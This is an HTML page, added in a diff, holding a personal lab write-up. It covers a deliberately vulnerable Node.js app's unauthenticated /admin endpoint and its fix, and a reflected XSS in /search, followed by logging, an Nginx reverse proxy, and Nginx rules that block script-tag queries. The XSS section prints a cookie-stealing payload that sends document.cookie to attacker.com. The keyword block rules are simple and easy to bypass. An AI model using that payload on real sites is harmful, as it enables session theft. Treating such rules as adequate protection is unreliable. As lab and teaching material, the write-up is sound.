@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnerable App Analysis</title>
+
+<style>
+:root{
+  --bg:#0d1117;
+  --code:#161b22;
+  --border:#30363d;
+  --text:#c9d1d9;
+  --muted:#8b949e;
+  --blue:#6cb6ff;
+  --red:#ff5c5c;
+  --white:#f0f6fc;
+}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:monospace;
+  font-size:25px;
+  margin:0;
+  line-height:1.95;
+}
+
+/* Sidebar */
+.sidebar{
+  width:300px;
+  padding:30px 24px;
+  border-right:1px solid var(--border);
+  position:fixed;
+  top:0;
+  left:0;
+  height:100vh;
+  background:#0d1117;
+  overflow-y:auto;
+}
+
+.sidebar h3{
+  color:var(--white);
+  font-size:34px;
+}
+
+.sidebar a{
+  display:block;
+  margin-bottom:12px;
+  color:var(--blue);
+  text-decoration:none;
+}
+
+.main{margin-left:300px}
+
+/* Header */
+.header{
+  border-bottom:1px solid var(--border);
+  padding:24px 46px;
+  position:sticky;
+  top:0;
+  background:#0d1117;
+}
+
+.header h1{
+  font-size:42px;
+}
+
+.nav a{
+  margin-right:20px;
+  color:var(--blue);
+  text-decoration:none;
+}
+
+/* Content */
+.content{
+  padding:40px;
+  max-width:1000px;
+}
+
+/* Titles */
+.section-title{
+  color:var(--red);
+  font-size:50px;
+}
+
+.subsection-title{
+  color:var(--blue);
+  font-size:34px;
+  margin-top:30px;
+}
+
+/* Code */
+pre{
+  background:var(--code);
+  padding:15px;
+  border-radius:10px;
+  border:1px solid var(--border);
+  overflow-x:auto;
+}
+
+code{color:#e6edf3}
+
+/* Images */
+.figure img{
+  width:100%;
+  border-radius:10px;
+  border:1px solid var(--border);
+  cursor: zoom-in;
+}
+
+hr{
+  border:none;
+  border-top:1px solid var(--border);
+  margin:40px 0;
+}
+</style>
+</head>
+
+<body>
+
+<div class="sidebar">
+<h3>Contents</h3>
+
+<a href="#vuln1">Broken Access Control</a>
+<a href="#attack1">Attack</a>
+<a href="#fix1">Fix</a>
+
+<a href="#vuln2">XSS</a>
+<a href="#attack2">Attack</a>
+<a href="#logging">Logging</a>
+
+<a href="#nginx">Nginx Setup</a>
+<a href="#blocking">Blocking</a>
+<a href="#conclusion">Conclusion</a>
+</div>
+
+<div class="main">
+
+<div class="header">
+<h1>Nikola | Writeups</h1>
+<div class="nav">
+<a href="../index.html">Home</a>
+<a href="../about.html">About</a>
+<a href="https://tryhackme.com/p/DrRobotNIK" target="_blank">TryHackMe</a>
+<a href="https://app.hackthebox.com/profile/mantymanty12" target="_blank" style="color:#9fef00;">HTB</a>
+</div>
+</div>
+
+<div class="content">
+
+<!-- ================= -->
+<h2 id="vuln1" class="section-title">Vulnerability 1: Broken Access Control</h2>
+
+<p>The /admin endpoint is accessible without enforcing authentication or authorization checks.</p>
+
+<div class="figure"><a href="images/vulnerable_login(1).png" target="_blank"><img src="images/vulnerable_login(1).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(2).png" target="_blank"><img src="images/vulnerable_login(2).png"></a></div>
+
+<p>The admin panel was accessed directly at:</p>
+
+<pre><code>http://localhost:3000/admin</code></pre>
+
+<p>The page loaded successfully without authentication, displaying:</p>
+
+<p>
+- Current user: Not logged in<br>
+- Current role: guest
+</p>
+
+<p>This confirms that access control is not enforced at the application level.</p>
+
+<h3 id="attack1" class="subsection-title">Attack</h3>
+
+<p>An attacker can directly access /admin without logging in.</p>
+
+<div class="figure"><a href="images/vulnerable_login(3).png" target="_blank"><img src="images/vulnerable_login(3).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(4).png" target="_blank"><img src="images/vulnerable_login(4).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(5).png" target="_blank"><img src="images/vulnerable_login(5).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(6).png" target="_blank"><img src="images/vulnerable_login(6).png"></a></div>
+
+<p>Even after logging in as a normal user (user / user123), the admin page remains accessible.</p>
+
+<div class="figure"><a href="images/vulnerable_login(7).png" target="_blank"><img src="images/vulnerable_login(7).png"></a></div>
+
+<p>
+Even though default values such as null (user) and "guest" (role) are assigned, no validation logic exists to restrict access.
+</p>
+
+<p>This allows exposure of sensitive content such as “Top Secret Data”.</p>
+
+<h3 id="fix1" class="subsection-title">Fix</h3>
+
+<pre><code>if (!req.session.user || req.session.role !== "admin") {
+    return res.status(403).send("Access denied");
+}</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(8).png" target="_blank"><img src="images/vulnerable_login(8).png"></a></div>
+
+<p>The fix enforces both authentication and role-based access control.</p>
+
+<div class="figure"><a href="images/vulnerable_login(9).png" target="_blank"><img src="images/vulnerable_login(9).png"></a></div>
+
+<p>Unauthorized users now receive a 403 response.</p>
+
+<div class="figure"><a href="images/vulnerable_login(10).png" target="_blank"><img src="images/vulnerable_login(10).png"></a></div>
+
+<p>Only admin users can access the admin panel.</p>
+
+<div class="figure"><a href="images/vulnerable_login(11).png" target="_blank"><img src="images/vulnerable_login(11).png"></a></div>
+
+<hr>
+
+<!-- ================= -->
+<h2 id="vuln2" class="section-title">Vulnerability 2: Reflected XSS</h2>
+
+<p>The /search endpoint reflects user input without proper encoding.</p>
+
+<div class="figure"><a href="images/vulnerable_login(12).png" target="_blank"><img src="images/vulnerable_login(12).png"></a></div>
+
+<p>EJS rendering:</p>
+
+<pre><code>&lt;%= %&gt; (safe)
+&lt;%- %&gt; (unsafe)</code></pre>
+
+<h3 id="attack2" class="subsection-title">Attack</h3>
+
+<pre><code>http://localhost:3000/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(13).png" target="_blank"><img src="images/vulnerable_login(13).png"></a></div>
+
+<p>The script executes in the browser.</p>
+
+<div class="figure"><a href="images/vulnerable_login(14).png" target="_blank"><img src="images/vulnerable_login(14).png"></a></div>
+
+<p>More advanced payload:</p>
+
+<pre><code>&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(15).png" target="_blank"><img src="images/vulnerable_login(15).png"></a></div>
+
+<p>Attackers can also create fake login prompts.</p>
+
+<div class="figure"><a href="images/vulnerable_login(16).png" target="_blank"><img src="images/vulnerable_login(16).png"></a></div>
+
+<h3 id="logging" class="subsection-title">Logging & Detection</h3>
+
+<p>Server-side logging was added to detect suspicious input.</p>
+
+<div class="figure"><a href="images/vulnerable_login(17).png" target="_blank"><img src="images/vulnerable_login(17).png"></a></div>
+
+<p>Normal input:</p>
+
+<div class="figure"><a href="images/vulnerable_login(18).png" target="_blank"><img src="images/vulnerable_login(18).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(19).png" target="_blank"><img src="images/vulnerable_login(19).png"></a></div>
+
+<p>Malicious input detection:</p>
+
+<div class="figure"><a href="images/vulnerable_login(21).png" target="_blank"><img src="images/vulnerable_login(21).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(22).png" target="_blank"><img src="images/vulnerable_login(22).png"></a></div>
+
+<hr>
+
+<h2 id="nginx" class="section-title">Nginx Reverse Proxy</h2>
+
+<div class="figure"><a href="images/vulnerable_login(20).png" target="_blank"><img src="images/vulnerable_login(20).png"></a></div>
+
+<p>The application was transferred to Ubuntu using SCP and executed with Node.js.</p>
+
+<div class="figure"><a href="images/vulnerable_login(23).png" target="_blank"><img src="images/vulnerable_login(23).png"></a></div>
+
+<p>Nginx was configured as a reverse proxy.</p>
+
+<div class="figure"><a href="images/vulnerable_login(24).png" target="_blank"><img src="images/vulnerable_login(24).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(25).png" target="_blank"><img src="images/vulnerable_login(25).png"></a></div>
+
+<pre><code>
+server {
+    listen 80;
+
+    location / {
+        proxy_pass http://localhost:3000;
+    }
+}
+</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(26).png" target="_blank"><img src="images/vulnerable_login(26).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(27).png" target="_blank"><img src="images/vulnerable_login(27).png"></a></div>
+
+<p>The application is now accessible externally.</p>
+
+<div class="figure"><a href="images/vulnerable_login(28).png" target="_blank"><img src="images/vulnerable_login(28).png"></a></div>
+<div class="figure"><a href="images/vulnerable_login(29).png" target="_blank"><img src="images/vulnerable_login(29).png"></a></div>
+
+<h3 id="blocking" class="subsection-title">Nginx Detection & Blocking</h3>
+
+<div class="figure"><a href="images/vulnerable_login(30).png" target="_blank"><img src="images/vulnerable_login(30).png"></a></div>
+
+<pre><code>sudo tail -f /var/log/nginx/access.log</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(31).png" target="_blank"><img src="images/vulnerable_login(31).png"></a></div>
+
+<p>Initial rule:</p>
+
+<pre><code>
+if ($query_string ~* "script") {
+    return 403;
+}
+</code></pre>
+
+<p>This failed due to URL encoding:</p>
+
+<pre><code>
+%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(32).png" target="_blank"><img src="images/vulnerable_login(32).png"></a></div>
+
+<p>Updated rule:</p>
+
+<pre><code>
+if ($request_uri ~* "%3Cscript%3E") {
+    return 403;
+}
+</code></pre>
+
+<div class="figure"><a href="images/vulnerable_login(33).png" target="_blank"><img src="images/vulnerable_login(33).png"></a></div>
+
+<p>Nginx blocks the request with 403.</p>
+
+<div class="figure"><a href="images/vulnerable_login(34).png" target="_blank"><img src="images/vulnerable_login(34).png"></a></div>
+
+<p>The request is still logged for analysis.</p>
+
+<hr>
+
+<h2 id="conclusion" class="section-title">Conclusion</h2>
+
+<p>This shows a layered defense approach combining detection and prevention.</p>
+
+</div>
+</div>
+
+</body>
+</html>
